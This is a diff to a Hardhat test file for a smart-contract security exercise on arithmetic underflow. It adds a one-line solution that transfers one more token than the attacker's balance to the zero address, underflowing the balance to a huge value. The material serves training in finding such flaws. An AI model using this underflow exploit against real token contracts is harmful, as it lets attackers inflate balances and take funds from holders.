@@ -20,17 +20,18 @@ describe('Arithmetic Over/Underflow Exercise 2', function () {
         this.token = await tokenFactory.deploy();
 
         await this.token.mint(deployer.address, DEPLOYER_MINT);
-        await this.token.mint(attacker.address, ATTACKER1_MINT); 
+        await this.token.mint(attacker.address, ATTACKER1_MINT);
     });
 
     it('Exploit', async function () {
         /** CODE YOUR SOLUTION HERE */
+        await this.token.connect(attacker).transfer(ethers.constants.AddressZero, ATTACKER1_MINT.add(1))
 
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
-        
+
         // Attacker should have a lot of tokens (at least more than 1 million)
         expect(await this.token.getBalance(attacker.address)).to.be.gt(
             ethers.utils.parseEther("1000000"));
